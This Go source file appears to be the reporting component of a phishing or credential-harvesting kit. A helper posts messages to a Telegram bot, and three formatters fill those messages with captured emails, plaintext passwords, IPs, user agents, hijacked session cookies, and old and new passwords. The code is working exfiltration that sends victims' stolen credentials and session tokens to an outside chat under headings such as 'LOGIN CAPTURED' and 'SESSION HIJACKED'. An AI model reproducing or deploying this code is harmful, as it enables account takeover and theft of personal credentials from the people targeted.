package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

type TelegramConfig struct {
	BotToken string
	ChatID   string
}

// SendTelegramMessage sends a formatted message to Telegram asynchronously
func SendTelegramMessage(cfg TelegramConfig, message string) {
	// FIX: Prevent useless API calls if credentials are missing (like on Render if you forget to set them)
	if cfg.BotToken == "" || cfg.ChatID == "" {
		return
	}

	go func() {
		payload := map[string]interface{}{
			"chat_id":    cfg.ChatID,
			"text":       message,
			"parse_mode": "HTML",
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			return
		}

		url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", cfg.BotToken)
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", "application/json")

		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		io.ReadAll(resp.Body) // Drain body to prevent connection leaks
	}()
}

func FormatLoginAlert(email, password, ip, userAgent string) string {
	return fmt.Sprintf(`
🔑 <b>LOGIN CAPTURED</b>
📧 Email: <code>%s</code>
🔒 Password: <code>%s</code>
🌐 IP: <code>%s</code>
🖥️ User-Agent: <code>%s</code>
⏰ Time: %s
`, email, password, ip, userAgent, time.Now().Format("15:04:05"))
}

func FormatCookieHarvest(email string, cookies []string) string {
	cookieStr := ""
	for _, c := range cookies {
		cookieStr += c + "\n"
	}
	return fmt.Sprintf(`
🍪 <b>SESSION HIJACKED</b>
📧 Target: <code>%s</code>
🔗 Cookies:
<code>%s</code>
`, email, cookieStr)
}

func FormatPasswordChange(oldPass, newPass, email string) string {
	return fmt.Sprintf(`
🔄 <b>PASSWORD CHANGED</b>
📧 User: <code>%s</code>
🔓 Old Pass: <code>%s</code>
🔑 New Pass: <code>%s</code>
⏰ Time: %s
`, email, oldPass, newPass, time.Now().Format("15:04:05"))
}
